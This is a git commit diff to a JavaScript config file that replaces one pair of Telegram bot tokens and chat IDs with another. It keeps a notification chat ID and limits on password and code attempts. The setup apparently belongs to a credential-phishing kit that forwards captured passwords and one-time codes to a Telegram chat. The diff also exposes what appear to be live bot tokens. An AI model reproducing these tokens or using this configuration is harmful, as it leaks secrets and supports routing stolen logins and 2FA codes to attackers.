bc10f37ce3ac17eb6875242ce8cd681df879cfb5
jaheimquina-eng <jaheimquina@gmail.com>
2025-10-30 08:31:42 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,7 +1,7 @@
 const config = {
-    token: '8249589822:AAGrP5OLiDVbrk5_y45z6n9AvRp8WyYUUA0',
-    chat_id: '8249589822',
-    noti_token: '8249589822:AAGrP5OLiDVbrk5_y45z6n9AvRp8WyYUUA0',
+    token: '8206500455:AAFoiOr7fQSIOCWGe789a-txLND6awLLde4',
+    chat_id: '8206500455',
+    noti_token: '8206500455:AAFoiOr7fQSIOCWGe789a-txLND6awLLde4',
     noti_chat_id: '-5033499662',
     max_password_attempts: 2,
     max_code_attempts: 2,
